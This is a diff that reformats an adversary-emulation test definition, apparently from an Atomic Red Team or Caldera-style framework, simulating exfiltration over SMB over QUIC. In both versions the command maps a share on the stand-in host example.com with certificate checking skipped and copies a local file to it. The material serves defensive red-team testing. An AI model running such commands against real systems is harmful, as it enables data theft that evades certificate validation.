@@ -1,13 +1,15 @@
-- id: 171e7cf6-4e4d-5fca-a42e-713d2611e408
+- requirements: []
   name: Soumaia ART Tests - Exfiltration Over SMB over QUIC (NET USE)
   description: "Simulates an attacker exfiltrating data over SMB over QUIC using the NET USE command.\nPrerequisites:\n  - A file server running Windows Server 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin Center (requires elevation)"
   tactic: lateral-movement
-  technique:
-    attack_id: T1570
-    name: Lateral Tool Transfer
-  platforms:
-    windows:
-      psh:
-        command: |-
-          NET USE * '\\example.com\sales' /TRANSPORT:QUIC /SKIPCERTCHECK
-          copy 'C:\path\to\file.txt' '*:\'
+  technique_id: T1570
+  technique_name: Lateral Tool Transfer
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: NET USE * '\\example.com\sales' /TRANSPORT:QUIC /SKIPCERTCHECK; copy 'C:\path\to\file.txt' '*:\'
+  id: 171e7cf6-4e4d-5fca-a42e-713d2611e408
